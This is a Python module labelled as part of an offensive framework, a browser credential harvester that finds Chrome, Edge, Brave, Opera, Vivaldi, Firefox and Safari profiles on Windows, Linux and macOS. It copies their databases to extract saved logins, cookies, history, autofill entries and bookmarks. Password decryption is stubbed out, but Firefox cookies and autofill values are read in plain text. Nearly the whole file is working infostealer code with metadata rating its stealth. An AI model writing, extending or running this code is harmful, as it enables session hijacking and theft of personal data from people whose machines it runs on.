"""
G3r4ki Offensive Framework - Browser Credential Harvester

This module extracts stored credentials from common browsers, including saved passwords,
cookies, and form data. It supports multiple platforms and browser types.
"""

import os
import json
import base64
import sqlite3
import shutil
import logging
import platform
import tempfile
from typing import Dict, List, Any, Optional, Tuple
from pathlib import Path

# Module metadata
METADATA = {
    'name': 'Browser Credential Harvester',
    'description': 'Extracts stored credentials from web browsers',
    'author': 'G3r4ki Security Team',
    'version': '1.0.0',
    'dependencies': [],
    'tags': ['credential_harvesting', 'browser', 'passwords', 'cookies'],
    'platforms': ['linux', 'windows', 'macos'],
    'min_resources': {'cpu': 1, 'memory': 128},
    'stealth_level': 6,
    'effectiveness': 8,
    'complexity': 7,
    'supported_mission_types': ['stealth', 'data_extraction']
}

logger = logging.getLogger(__name__)

class BrowserCredentialHarvester:
    """
    Extracts credentials from common browsers
    """
    
    def __init__(self, options: Optional[Dict[str, Any]] = None):
        """
        Initialize the harvester
        
        Args:
            options: Optional configuration options
        """
        self.options = options or {}
        self.system = platform.system().lower()
        
        # Browser paths by platform
        self.browser_paths = {
            'windows': {
                'chrome': os.path.expandvars('%LOCALAPPDATA%\\Google\\Chrome\\User Data'),
                'firefox': os.path.expandvars('%APPDATA%\\Mozilla\\Firefox\\Profiles'),
                'edge': os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\User Data'),
                'brave': os.path.expandvars('%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data'),
                'opera': os.path.expandvars('%APPDATA%\\Opera Software\\Opera Stable'),
                'vivaldi': os.path.expandvars('%LOCALAPPDATA%\\Vivaldi\\User Data'),
            },
            'linux': {
                'chrome': os.path.expanduser('~/.config/google-chrome'),
                'firefox': os.path.expanduser('~/.mozilla/firefox'),
                'edge': os.path.expanduser('~/.config/microsoft-edge'),
                'brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
                'opera': os.path.expanduser('~/.config/opera'),
                'vivaldi': os.path.expanduser('~/.config/vivaldi'),
            },
            'darwin': {  # macOS
                'chrome': os.path.expanduser('~/Library/Application Support/Google/Chrome'),
                'firefox': os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
                'edge': os.path.expanduser('~/Library/Application Support/Microsoft Edge'),
                'brave': os.path.expanduser('~/Library/Application Support/BraveSoftware/Brave-Browser'),
                'opera': os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera'),
                'safari': os.path.expanduser('~/Library/Safari'),
                'vivaldi': os.path.expanduser('~/Library/Application Support/Vivaldi'),
            }
        }
        
    def harvest_all_browsers(self) -> Dict[str, Any]:
        """
        Harvest credentials from all available browsers
        
        Returns:
            Dictionary with results by browser
        """
        results = {}
        platform_key = self._get_platform_key()
        
        if platform_key not in self.browser_paths:
            logger.warning(f"Unsupported platform: {platform_key}")
            return {'error': f"Unsupported platform: {platform_key}"}
            
        browser_paths = self.browser_paths[platform_key]
        
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                try:
                    logger.info(f"Harvesting credentials from {browser}")
                    results[browser] = self._harvest_browser(browser, path)
                except Exception as e:
                    logger.error(f"Error harvesting {browser}: {e}")
                    results[browser] = {'error': str(e)}
            else:
                logger.debug(f"Browser not found: {browser} at {path}")
                
        return results
    
    def harvest_browser(self, browser: str) -> Dict[str, Any]:
        """
        Harvest credentials from a specific browser
        
        Args:
            browser: Browser name (chrome, firefox, etc.)
            
        Returns:
            Dictionary with harvested credentials
            
        Raises:
            ValueError: If browser is not supported or not found
        """
        platform_key = self._get_platform_key()
        
        if platform_key not in self.browser_paths:
            raise ValueError(f"Unsupported platform: {platform_key}")
            
        browser_paths = self.browser_paths[platform_key]
        
        if browser not in browser_paths:
            raise ValueError(f"Unsupported browser: {browser}")
            
        path = browser_paths[browser]
        
        if not os.path.exists(path):
            raise ValueError(f"Browser not found: {browser} at {path}")
            
        return self._harvest_browser(browser, path)
    
    def _get_platform_key(self) -> str:
        """
        Get the platform key for browser paths
        
        Returns:
            Platform key string
        """
        system = platform.system().lower()
        
        if system == 'windows':
            return 'windows'
        elif system == 'linux':
            return 'linux'
        elif system == 'darwin':
            return 'darwin'
        else:
            return system
    
    def _harvest_browser(self, browser: str, path: str) -> Dict[str, Any]:
        """
        Harvest credentials from a specific browser
        
        Args:
            browser: Browser name
            path: Browser data path
            
        Returns:
            Dictionary with harvested credentials
        """
        results = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'bookmarks': [],
            'form_data': []
        }
        
        # Dispatch to browser-specific harvesters
        if browser == 'chrome' or browser == 'edge' or browser == 'brave' or browser == 'vivaldi':
            self._harvest_chromium_based(browser, path, results)
        elif browser == 'firefox':
            self._harvest_firefox(path, results)
        elif browser == 'safari':
            self._harvest_safari(path, results)
        elif browser == 'opera':
            self._harvest_opera(path, results)
        else:
            logger.warning(f"No specific harvester for {browser}, using generic approach")
            self._harvest_generic(browser, path, results)
            
        return results
    
    def _harvest_chromium_based(self, browser: str, path: str, results: Dict[str, List[Any]]) -> None:
        """
        Harvest credentials from Chromium-based browsers (Chrome, Edge, Brave, etc.)
        
        Args:
            browser: Browser name
            path: Browser data path
            results: Results dictionary to update
        """
        # Find all user profiles
        profiles = self._find_chromium_profiles(path)
        
        for profile in profiles:
            profile_name = os.path.basename(profile)
            logger.info(f"Processing {browser} profile: {profile_name}")
            
            # Login Data (passwords)
            login_db = os.path.join(profile, 'Login Data')
            if os.path.exists(login_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_login_db = temp_file.name
                        
                    # Make a copy of the database since it might be locked
                    shutil.copy2(login_db, temp_login_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_login_db)
                    cursor = conn.cursor()
                    
                    # Get the correct query based on schema version
                    try:
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            url, username, password = row
                            # Note: In a real implementation, we would decrypt the password
                            # This requires OS-specific decryption routines
                            password_data = f"<encrypted_data_len_{len(password)}>"
                            
                            results['passwords'].append({
                                'browser': browser,
                                'profile': profile_name,
                                'url': url,
                                'username': username,
                                'password': password_data
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read logins table in {browser} profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_login_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting passwords from {browser} profile {profile_name}: {e}")
            
            # Cookies
            cookies_db = os.path.join(profile, 'Cookies')
            if os.path.exists(cookies_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_cookies_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(cookies_db, temp_cookies_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            host, name, path, encrypted_value, expires = row
                            # Note: In a real implementation, we would decrypt the cookie value
                            value_data = f"<encrypted_data_len_{len(encrypted_value)}>"
                            
                            results['cookies'].append({
                                'browser': browser,
                                'profile': profile_name,
                                'host': host,
                                'name': name,
                                'path': path,
                                'value': value_data,
                                'expires': expires
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read cookies table in {browser} profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_cookies_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting cookies from {browser} profile {profile_name}: {e}")
            
            # History
            history_db = os.path.join(profile, 'History')
            if os.path.exists(history_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_history_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(history_db, temp_history_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_history_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            url, title, visit_time = row
                            results['history'].append({
                                'browser': browser,
                                'profile': profile_name,
                                'url': url,
                                'title': title,
                                'visit_time': visit_time
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read history table in {browser} profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_history_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting history from {browser} profile {profile_name}: {e}")
                    
            # Web Data (form data)
            webdata_db = os.path.join(profile, 'Web Data')
            if os.path.exists(webdata_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_webdata_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(webdata_db, temp_webdata_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_webdata_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('SELECT name, value FROM autofill')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            name, value = row
                            results['form_data'].append({
                                'browser': browser,
                                'profile': profile_name,
                                'name': name,
                                'value': value
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read autofill table in {browser} profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_webdata_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting form data from {browser} profile {profile_name}: {e}")
                    
            # Bookmarks
            bookmarks_file = os.path.join(profile, 'Bookmarks')
            if os.path.exists(bookmarks_file):
                try:
                    with open(bookmarks_file, 'r', encoding='utf-8') as f:
                        bookmarks_data = json.load(f)
                        
                    # Extract bookmarks (simplified)
                    if 'roots' in bookmarks_data:
                        for root_name, root in bookmarks_data['roots'].items():
                            if 'children' in root:
                                for bookmark in root['children']:
                                    if 'url' in bookmark:
                                        results['bookmarks'].append({
                                            'browser': browser,
                                            'profile': profile_name,
                                            'name': bookmark.get('name', ''),
                                            'url': bookmark['url'],
                                            'category': root_name
                                        })
                except Exception as e:
                    logger.error(f"Error extracting bookmarks from {browser} profile {profile_name}: {e}")
    
    def _find_chromium_profiles(self, path: str) -> List[str]:
        """
        Find all user profiles in a Chromium-based browser
        
        Args:
            path: Browser data path
            
        Returns:
            List of profile directory paths
        """
        profiles = []
        
        # Default profile
        default_profile = os.path.join(path, 'Default')
        if os.path.exists(default_profile) and os.path.isdir(default_profile):
            profiles.append(default_profile)
            
        # Other profiles
        for item in os.listdir(path):
            if item.startswith('Profile ') and os.path.isdir(os.path.join(path, item)):
                profiles.append(os.path.join(path, item))
                
        return profiles
    
    def _harvest_firefox(self, path: str, results: Dict[str, List[Any]]) -> None:
        """
        Harvest credentials from Firefox
        
        Args:
            path: Firefox profiles directory
            results: Results dictionary to update
        """
        # Find all Firefox profiles
        profiles = []
        
        # Read profiles.ini if it exists
        profiles_ini = os.path.join(path, 'profiles.ini')
        if os.path.exists(profiles_ini):
            try:
                import configparser
                config = configparser.ConfigParser()
                config.read(profiles_ini)
                
                for section in config.sections():
                    if section.startswith('Profile'):
                        if config.has_option(section, 'Path'):
                            profile_path = config.get(section, 'Path')
                            if config.has_option(section, 'IsRelative') and config.getboolean(section, 'IsRelative'):
                                profile_path = os.path.join(path, profile_path)
                            profiles.append(profile_path)
            except Exception as e:
                logger.error(f"Error parsing Firefox profiles.ini: {e}")
                
        # Fallback: Look for directories in the profiles directory
        if not profiles:
            try:
                for item in os.listdir(path):
                    if os.path.isdir(os.path.join(path, item)) and item.endswith('.default'):
                        profiles.append(os.path.join(path, item))
            except Exception as e:
                logger.error(f"Error scanning Firefox profiles directory: {e}")
                
        # Process each profile
        for profile in profiles:
            profile_name = os.path.basename(profile)
            logger.info(f"Processing Firefox profile: {profile_name}")
            
            # Login data (passwords) - logins.json
            logins_file = os.path.join(profile, 'logins.json')
            if os.path.exists(logins_file):
                try:
                    with open(logins_file, 'r', encoding='utf-8') as f:
                        logins_data = json.load(f)
                        
                    if 'logins' in logins_data:
                        for login in logins_data['logins']:
                            # Note: Firefox encrypts these values, in a real implementation we would decrypt them
                            hostname = login.get('hostname', '')
                            username = f"<encrypted_data_len_{len(login.get('encryptedUsername', ''))}>"
                            password = f"<encrypted_data_len_{len(login.get('encryptedPassword', ''))}>"
                            
                            results['passwords'].append({
                                'browser': 'firefox',
                                'profile': profile_name,
                                'url': hostname,
                                'username': username,
                                'password': password
                            })
                except Exception as e:
                    logger.error(f"Error extracting passwords from Firefox profile {profile_name}: {e}")
                    
            # Cookies - cookies.sqlite
            cookies_db = os.path.join(profile, 'cookies.sqlite')
            if os.path.exists(cookies_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_cookies_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(cookies_db, temp_cookies_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_cookies_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            host, name, path, value, expires = row
                            
                            results['cookies'].append({
                                'browser': 'firefox',
                                'profile': profile_name,
                                'host': host,
                                'name': name,
                                'path': path,
                                'value': value,
                                'expires': expires
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read cookies table in Firefox profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_cookies_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting cookies from Firefox profile {profile_name}: {e}")
                    
            # History - places.sqlite
            history_db = os.path.join(profile, 'places.sqlite')
            if os.path.exists(history_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_history_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(history_db, temp_history_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_history_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('''
                            SELECT url, title, last_visit_date 
                            FROM moz_places 
                            WHERE last_visit_date IS NOT NULL 
                            ORDER BY last_visit_date DESC 
                            LIMIT 100
                        ''')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            url, title, visit_time = row
                            results['history'].append({
                                'browser': 'firefox',
                                'profile': profile_name,
                                'url': url,
                                'title': title,
                                'visit_time': visit_time
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read history table in Firefox profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_history_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting history from Firefox profile {profile_name}: {e}")
                    
            # Form data - formhistory.sqlite
            formhistory_db = os.path.join(profile, 'formhistory.sqlite')
            if os.path.exists(formhistory_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_formhistory_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(formhistory_db, temp_formhistory_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_formhistory_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('SELECT fieldname, value FROM moz_formhistory')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            name, value = row
                            results['form_data'].append({
                                'browser': 'firefox',
                                'profile': profile_name,
                                'name': name,
                                'value': value
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read form history table in Firefox profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_formhistory_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting form data from Firefox profile {profile_name}: {e}")
                    
            # Bookmarks - places.sqlite (already opened above)
            if os.path.exists(history_db):
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                        temp_bookmarks_db = temp_file.name
                        
                    # Make a copy of the database
                    shutil.copy2(history_db, temp_bookmarks_db)
                    
                    # Connect to the copy
                    conn = sqlite3.connect(temp_bookmarks_db)
                    cursor = conn.cursor()
                    
                    try:
                        cursor.execute('''
                            SELECT b.title, p.url, b.parent
                            FROM moz_bookmarks b
                            JOIN moz_places p ON b.fk = p.id
                            WHERE b.type = 1
                        ''')
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            title, url, parent = row
                            results['bookmarks'].append({
                                'browser': 'firefox',
                                'profile': profile_name,
                                'name': title,
                                'url': url,
                                'category': f"folder_{parent}"
                            })
                    except sqlite3.OperationalError:
                        logger.warning(f"Could not read bookmarks in Firefox profile {profile_name}")
                        
                    conn.close()
                    
                    # Clean up
                    try:
                        os.unlink(temp_bookmarks_db)
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Error extracting bookmarks from Firefox profile {profile_name}: {e}")
    
    def _harvest_safari(self, path: str, results: Dict[str, List[Any]]) -> None:
        """
        Harvest credentials from Safari
        
        Args:
            path: Safari data directory
            results: Results dictionary to update
        """
        # Since Safari stores sensitive data in the macOS keychain, a real implementation
        # would need to access the keychain, which requires specific permissions.
        # We'll implement a simplified version here.
        
        # History
        history_db = os.path.join(path, 'History.db')
        if os.path.exists(history_db):
            try:
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_history_db = temp_file.name
                    
                # Make a copy of the database
                shutil.copy2(history_db, temp_history_db)
                
                # Connect to the copy
                conn = sqlite3.connect(temp_history_db)
                cursor = conn.cursor()
                
                try:
                    cursor.execute('''
                        SELECT url, title, visit_time
                        FROM history_visits v
                        JOIN history_items i ON v.history_item = i.id
                        ORDER BY visit_time DESC
                        LIMIT 100
                    ''')
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        url, title, visit_time = row
                        results['history'].append({
                            'browser': 'safari',
                            'profile': 'default',
                            'url': url,
                            'title': title,
                            'visit_time': visit_time
                        })
                except sqlite3.OperationalError:
                    logger.warning("Could not read Safari history table")
                    
                conn.close()
                
                # Clean up
                try:
                    os.unlink(temp_history_db)
                except Exception:
                    pass
                    
            except Exception as e:
                logger.error(f"Error extracting history from Safari: {e}")
                
        # Bookmarks
        bookmarks_file = os.path.join(path, 'Bookmarks.plist')
        if os.path.exists(bookmarks_file):
            try:
                # In a real implementation, we would parse the plist file
                # For simplicity, we'll just note that it exists
                results['bookmarks'].append({
                    'browser': 'safari',
                    'profile': 'default',
                    'name': '<plist_parsing_required>',
                    'url': '<plist_parsing_required>',
                    'category': 'safari_bookmarks'
                })
            except Exception as e:
                logger.error(f"Error extracting bookmarks from Safari: {e}")
    
    def _harvest_opera(self, path: str, results: Dict[str, List[Any]]) -> None:
        """
        Harvest credentials from Opera
        
        Args:
            path: Opera data directory
            results: Results dictionary to update
        """
        # Modern Opera is Chromium-based, so we can reuse the Chromium harvester
        self._harvest_chromium_based('opera', path, results)
    
    def _harvest_generic(self, browser: str, path: str, results: Dict[str, List[Any]]) -> None:
        """
        Generic credential harvesting approach
        
        Args:
            browser: Browser name
            path: Browser data directory
            results: Results dictionary to update
        """
        # Look for common database files
        for root, dirs, files in os.walk(path):
            for file in files:
                lower_file = file.lower()
                
                # Check for potential credential stores
                if 'login' in lower_file or 'password' in lower_file or 'credential' in lower_file:
                    file_path = os.path.join(root, file)
                    results['passwords'].append({
                        'browser': browser,
                        'profile': os.path.basename(root),
                        'file': file_path,
                        'note': 'Potential password store identified'
                    })
                    
                # Check for cookie stores
                if 'cookie' in lower_file:
                    file_path = os.path.join(root, file)
                    results['cookies'].append({
                        'browser': browser,
                        'profile': os.path.basename(root),
                        'file': file_path,
                        'note': 'Potential cookie store identified'
                    })
                    
                # Check for history stores
                if 'history' in lower_file or 'visit' in lower_file:
                    file_path = os.path.join(root, file)
                    results['history'].append({
                        'browser': browser,
                        'profile': os.path.basename(root),
                        'file': file_path,
                        'note': 'Potential history store identified'
                    })


def execute(context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute the browser credential harvester module
    
    Args:
        context: Execution context
            - 'target': Target information
            - 'options': Module options
    
    Returns:
        Dict containing execution results
    """
    # Extract options from context
    options = context.get('options', {})
    
    # Initialize harvester
    harvester = BrowserCredentialHarvester(options)
    
    # Determine which browsers to harvest
    browsers = options.get('browsers', [])
    results = {
        'status': 'success',
        'message': 'Harvested browser credentials',
        'data': {}
    }
    
    try:
        if browsers:
            # Harvest specific browsers
            for browser in browsers:
                try:
                    results['data'][browser] = harvester.harvest_browser(browser)
                except Exception as e:
                    results['data'][browser] = {'error': str(e)}
        else:
            # Harvest all available browsers
            results['data'] = harvester.harvest_all_browsers()
    except Exception as e:
        results['status'] = 'error'
        results['message'] = f'Error harvesting browser credentials: {str(e)}'
    
    return results